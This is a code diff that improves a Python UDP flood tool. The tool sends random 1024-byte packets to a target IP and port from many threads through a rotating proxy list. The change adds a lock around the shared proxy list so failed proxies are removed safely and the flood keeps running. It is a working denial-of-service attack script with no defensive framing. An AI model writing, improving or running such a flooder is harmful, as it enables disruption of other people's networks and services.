@@ -4,17 +4,17 @@ import time
 import sys
 import threading
 
-def udp_attack(target_ip, target_port, duration, proxies, rpc):
+def udp_attack(target_ip, target_port, duration, proxies, rpc, lock):
     end_time = time.time() + duration
     payload = random._urandom(1024)  # 1024-byte random payload
 
     while time.time() < end_time:
-        proxy = random.choice(proxies).split(":")
-        if len(proxy) != 2:
-            print(f"Invalid proxy format. Expected format: IP:PORT")
-            continue
+        with lock:
+            if not proxies:
+                break
+            proxy = random.choice(proxies)
 
-        proxy_ip, proxy_port = proxy[0], int(proxy[1])
+        proxy_ip, proxy_port = proxy.split(":")
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.settimeout(0.1)  # Set a short timeout for the connection
@@ -25,7 +25,9 @@ def udp_attack(target_ip, target_port, duration, proxies, rpc):
                 sock.sendto(payload, (target_ip, target_port))
             print(f"Attack successfully sent to {target_ip}:{target_port} with proxy {proxy_ip}:{proxy_port}")
         except Exception as e:
-            proxies.remove(proxy)
+            with lock:
+                if proxy in proxies:
+                    proxies.remove(proxy)
             print(f"Attack failed, [Reason : {str(e)}]. Proxy {proxy_ip}:{proxy_port} removed from list.")
         finally:
             sock.close()
@@ -38,10 +40,11 @@ def start_attack(target_ip, target_port, duration, proxy_file, threads, rpc):
         print(f"Proxy file '{proxy_file}' not found.")
         sys.exit(1)
 
+    lock = threading.Lock()
     thread_list = []
 
     for _ in range(threads):
-        thread = threading.Thread(target=udp_attack, args=(target_ip, target_port, duration, proxies, rpc))
+        thread = threading.Thread(target=udp_attack, args=(target_ip, target_port, duration, proxies, rpc, lock))
         thread.start()
         thread_list.append(thread)
 
